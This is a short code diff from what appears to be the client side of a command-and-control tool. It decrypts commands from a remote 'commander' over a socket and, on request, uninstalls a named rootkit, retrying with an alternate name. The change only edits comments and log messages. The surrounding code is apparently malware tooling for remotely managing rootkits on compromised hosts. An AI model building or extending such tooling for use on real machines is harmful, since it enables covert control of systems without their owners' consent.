@@ -273,18 +273,18 @@ if __name__ == '__main__':
                         print(constants.AWAIT_NEXT_OP_MSG)
                         print(constants.MENU_CLOSING_BANNER)
 
+                # g) Uninstall Rootkit
                 if decrypted_data == constants.UNINSTALL:
-                    # a) Receive rootkit name from commander
+                    # Receive rootkit name from commander
                     print(constants.CLIENT_RESPONSE.format(constants.UNINSTALL))
                     rootkit_names = decrypt_string(client_socket.recv(1024).decode(), shared_secret).split("/")
 
-                    # b) Uninstall Rootkit
+                    # Uninstall Rootkit
                     try:
-                        print("[+] Now uninstalling rootkit: {}".format(rootkit_names[0]))
                         uninstall(rootkit_names[0])
                     except FileNotFoundError as e:
                         print("[+] UNINSTALL ERROR: An error has occurred {}".format(e))
-                        print("[+] Now uninstalling rootkit with alternate name: {}".format(rootkit_names[1]))
+                        print("[+] Re-attempting with alternate project name...")
                         uninstall(rootkit_names[1])
 
         except ConnectionResetError:
